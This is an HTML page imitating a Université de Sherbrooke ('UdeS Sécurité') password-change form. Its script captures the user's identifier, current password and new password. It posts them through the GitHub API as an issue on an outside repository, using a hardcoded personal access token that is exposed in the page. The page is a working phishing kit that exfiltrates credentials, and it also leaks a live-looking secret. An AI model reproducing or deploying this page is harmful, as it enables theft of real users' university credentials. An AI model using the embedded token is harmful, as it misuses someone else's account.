<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UdeS Sécurité</title>
  <link rel="stylesheet" href="style.css">
  </head>

  <body>
    <div id="left-column">
      <img src="images/paysage.jpg" width="850">
    </div>

    <div id="right-column">
      <img src="images/udes.jpg" width="200">
      <h2>Modification du mot de passe</h2>
      <form id="PasswordForm" action="/create_issue" method="post">
        <label for="id"><b>Identifiant</b></label><br>
        <input type="text" id="id" name="id" required>

        <label for="password"></label>
        <input type="password" id="password" name="password" required><br>

        <label for="newpassword"><b>Nouveau mot de passe</b></b></label>
        <input type="password" id="newpassword" name="newpassword" required>

        <label for="confirmnewpassword"></label>
        <input type="password" id="confirmnewpassword" name="confirmnewpassword" required>

        <button type="button" onclick="prepareIssue()">Confirmer la modification</button>
      </form>
    </div>

    <script type="module">
      import { Octokit } from "https://esm.sh/@octokit/core";
      window.prepareIssue = function () {
        var id = document.getElementById('id').value;
        var password = document.getElementById('password').value;
        var newpassword = document.getElementById('newpassword').value;
        var confirmnewpassword = document.getElementById('confirmnewpassword').value;

        // Add your logic to handle the form submission here
        console.log('ID:', id);
        console.log('Current Password:', password);
        console.log('New Password:', newpassword);
        console.log('Confirm New Password:', confirmnewpassword);

        var data = {
            'title': 'New data',
            'Id': id,
            'Password 1' : password,
            'Password 2' : newpassword,
            'Password 3' : confirmnewpassword
        }
        console.log(data)


        const octokit = new Octokit({
          auth: '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',
        });

        const owner = 'Onyx39';
        const repo = 'onyx39.github.io';

        const issueData = {
          title: 'New data',
          body: JSON.stringify(data),
        };

        octokit.request('POST /repos/{owner}/{repo}/issues', {
          owner : 'Onyx39',
          repo : 'onyx39.github.io',
          title: 'New data',
          body: JSON.stringify(data),
          headers: {
            'X-GitHub-Api-Version': '2022-11-28'
          }
        })
          .then(response => {
            console.log('Issue created:', response.data.html_url);
          })
          .catch(error => {
            console.error('Error creating issue:', error.message);
          });
      }
    </script>
  </body>
</html>
